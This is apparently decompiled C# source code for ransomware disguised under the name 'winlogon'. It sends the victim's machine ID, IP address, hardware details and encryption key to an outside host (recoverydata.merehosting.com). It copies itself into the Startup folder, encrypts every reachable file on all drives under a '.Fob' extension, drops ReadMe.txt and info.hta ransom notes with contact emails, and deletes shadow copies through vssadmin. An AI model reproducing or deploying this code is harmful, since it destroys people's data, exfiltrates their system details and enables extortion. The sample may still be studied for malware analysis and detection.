using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DUMB;
using File_encryption;
using Microsoft.VisualBasic;
using winlogon.Properties;

namespace winlogon;

internal static class winlogone
{
	private static readonly string Root = Environment.GetFolderPath(Environment.SpecialFolder.System);

	private static readonly string SystemDisk = Path.GetPathRoot(Root);

	public static readonly string DesktopDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private static readonly string MyComputerDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);

	private static readonly string DesktopDirectoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static readonly string FavoritesDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);

	private static readonly string MyDocumentspDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string MyMusicDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	private static readonly string HistoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.History);

	private static readonly string PersonalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string DownloadsDirectory = Interaction.Environ("USERPROFILE") + "\\Downloads";

	private static readonly string DocumentsDirectory = Interaction.Environ("USERPROFILE") + "\\Documents";

	private static readonly string PicturesDirectory = Interaction.Environ("USERPROFILE") + "\\Pictures";

	private static readonly string VideosDirectory = Interaction.Environ("USERPROFILE") + "\\Videos";

	private static readonly string MusicDirectory = Interaction.Environ("USERPROFILE") + "\\Music";

	private static readonly string UserProfile = Interaction.Environ("USERPROFILE");

	private static readonly string UserFolder = "C:\\";

	public static string[] ValidExtension = new string[1] { "*.*" };

	public static string Key { get; } = config.GetUniqueKey(133);


	private static string[] Folder { get; set; }

	private static string[] Files { get; set; }

	private static string ProgramData { get; } = SystemDisk + "\\ProgramData";


	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	private static string GetID()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"C:\"");
		val.Get();
		if (!string.IsNullOrEmpty(((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString()))
		{
			return ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		}
		string text = string.Empty;
		ManagementObjectEnumerator enumerator = new ManagementClass("Win32_Processor").GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (text == string.Empty)
				{
					text = ((ManagementBaseObject)val2).get_Properties().get_Item("ProcessorId").get_Value()
						.ToString();
				}
			}
			return text;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static void save()
	{
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		long bytes = 0L;
		try
		{
			List<long> list = new List<long>();
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					list.Add(driveInfo.TotalSize - driveInfo.TotalFreeSpace);
				}
			}
			bytes = list.Sum((long x) => Convert.ToInt64(x));
		}
		catch
		{
		}
		try
		{
			using WebClient webClient = new WebClient();
			ServicePointManager.Expect100Continue = false;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
			webClient.Headers.Add("TargetID", GetID());
			webClient.Headers.Add("Attacker", config.Soldier);
			webClient.Headers.Add("TargetName", Environment.MachineName);
			webClient.Headers.Add("TargetOS", smethod_1());
			webClient.Headers.Add("TargetHard", smethod_0(bytes));
			webClient.Headers.Add("TargetCpu", smethod_2());
			webClient.Headers.Add("TargetIp", new WebClient().DownloadString("http://icanhazip.com"));
			webClient.Headers.Add("TargetCryptography", Key);
			webClient.DownloadString("http://recoverydata.merehosting.com/db");
		}
		catch (Exception ex)
		{
			LogError(ex.Message);
			((Form)new password_display()).ShowDialog();
		}
	}

	private static void StartUPAdd()
	{
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\winlogon.exe");
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\info.hta", Resources.info.Replace("_email2_", config.Email_1).Replace("_email1_", config.Email_2).Replace("_id_", GetID()));
		}
		catch
		{
		}
	}

	private static void Main(string[] args)
	{
		save();
		StartUPAdd();
		AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
		RunEncrypt();
		SearchDisk();
		DeleteShadowCopy();
	}

	private static void DeleteShadowCopy()
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			Process process = new Process();
			process.StartInfo = startInfo;
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	private static void CurrentDomain_ProcessExit(object sender, EventArgs e)
	{
		File.WriteAllText("info.hta", Resources.info.Replace("_email2_", config.Email_1).Replace("_email1_", config.Email_2).Replace("_id_", GetID()));
		if (Process.GetProcessesByName("mshta").Length.Equals(0))
		{
			for (int i = 0; i < 1; i++)
			{
				Process.Start("info.hta");
			}
		}
	}

	public static void RunEncrypt()
	{
		foreach (string item in new List<string>
		{
			UserFolder,
			DesktopDirectory,
			MyComputerDirectory,
			DesktopDirectoryDirectory,
			MyDocumentspDirectory,
			MyMusicDirectory,
			HistoryDirectory,
			PersonalDirectory,
			DownloadsDirectory,
			DocumentsDirectory,
			PicturesDirectory,
			VideosDirectory,
			MusicDirectory,
			UserProfile,
			FavoritesDirectory,
			ProgramData,
			SystemDisk + "\\Users\\"
		})
		{
			SearchFolder(item);
			SearchFile(item);
		}
	}

	internal static void SearchDisk()
	{
		Parallel.ForEach(from x in DriveInfo.GetDrives()
			where x.IsReady
			select x, delegate(DriveInfo lable)
		{
			if (lable.Name != SystemDisk)
			{
				SearchFolder(lable.Name);
			}
			else
			{
				SearchFile(lable.Name);
			}
			SearchFile(lable.Name);
		});
	}

	internal static void SearchFolder(string name)
	{
		try
		{
			Folder = Directory.GetDirectories(name, "*", SearchOption.TopDirectoryOnly);
		}
		catch (Exception)
		{
			return;
		}
		string[] folder = Folder;
		foreach (string nameFolder in folder)
		{
			if (nameFolder != "C:\\Windows")
			{
				SearchFile(nameFolder);
				new Thread((ThreadStart)delegate
				{
					SearchFolder(nameFolder);
				}).Start();
			}
		}
	}

	internal static void SearchFile(string name)
	{
		string[] validExtension = ValidExtension;
		foreach (string text in validExtension)
		{
			try
			{
				Files = Directory.GetFiles(name, "*" + text, SearchOption.TopDirectoryOnly);
			}
			catch (Exception)
			{
				break;
			}
			string[] files = Files;
			for (int j = 0; j < files.Length; j++)
			{
				Encrypt(files[j]);
			}
		}
	}

	private static string MD5(string input)
	{
		byte[] source = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(input));
		return string.Join("", source.Select((byte b) => b.ToString("x2")).ToArray());
	}

	private static string SHA1(string input)
	{
		byte[] source = new SHA1CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(input));
		return string.Join("", source.Select((byte b) => b.ToString("x2")).ToArray());
	}

	private static void LogError(string _message)
	{
		Console.BackgroundColor = ConsoleColor.Red;
		Console.WriteLine(_message);
		Console.ResetColor();
	}

	public static byte[] KeyEncrypt(string s)
	{
		return new UTF8Encoding().GetBytes(SHA1(MD5(MD5(SHA1(s)))));
	}

	internal static void Encrypt(string name)
	{
		Console.WriteLine(name);
		try
		{
			if (!(new FileInfo(name).Name != "ReadMe.txt") || !(new FileInfo(name).Extension != ".Fob") || !(new FileInfo(name).Name != "info.hta") || !(new FileInfo(name).Name != "BOOTNXT") || !(new FileInfo(name).Name != "bootmgr") || !(new FileInfo(name).Name != "BOOTSECT.BAK") || !(new FileInfo(name).Name != "boot.sdi") || !(new FileInfo(name).Name != "ReAgent.xml") || !(new FileInfo(name).Name != "Winre.wim") || !(new FileInfo(name).Name != "BOOTSTAT.DAT"))
			{
				return;
			}
			if (!File.Exists(Path.GetDirectoryName(name) + "\\ReadMe.txt"))
			{
				try
				{
					File.WriteAllText(Path.GetDirectoryName(name) + "\\ReadMe.txt", config.Readme_Text.Replace("_pcid_", GetID()).Replace("_em1_", config.Email_1).Replace("_em2_", config.Email_2));
				}
				catch
				{
				}
			}
			if (!File.Exists(Path.GetDirectoryName(name) + "\\info.hta"))
			{
				try
				{
					File.WriteAllText(Path.GetDirectoryName(name) + "\\info.hta", Resources.info.Replace("_email2_", config.Email_1).Replace("_email1_", config.Email_2).Replace("_id_", GetID()));
				}
				catch
				{
				}
			}
			Crypt.CryptFile(new ISAAC(), KeyEncrypt(Key), name);
			File.Move(name, name + ".[" + GetID() + "[" + config.Email_1 + "].Fob");
		}
		catch (Exception ex)
		{
			LogError(ex.Message);
		}
	}

	[CompilerGenerated]
	internal static string smethod_0(long bytes)
	{
		try
		{
			string[] array = new string[5] { "B", "KB", "MB", "GB", "TB" };
			double num = bytes;
			int num2 = 0;
			while (num2 < array.Length && bytes >= 1024L)
			{
				num = (double)bytes / 1024.0;
				num2++;
				bytes /= 1024L;
			}
			return $"{num:0.##} {array[num2]}";
		}
		catch
		{
			return string.Empty;
		}
	}

	[CompilerGenerated]
	internal static string smethod_1()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		object obj = (from ManagementObject x in (IEnumerable)new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get()
			select ((ManagementBaseObject)x).GetPropertyValue("Caption")).FirstOrDefault();
		if (obj == null)
		{
			return "N/A";
		}
		return obj.ToString();
	}

	[CompilerGenerated]
	internal static string smethod_2()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return string.Empty;
	}
}
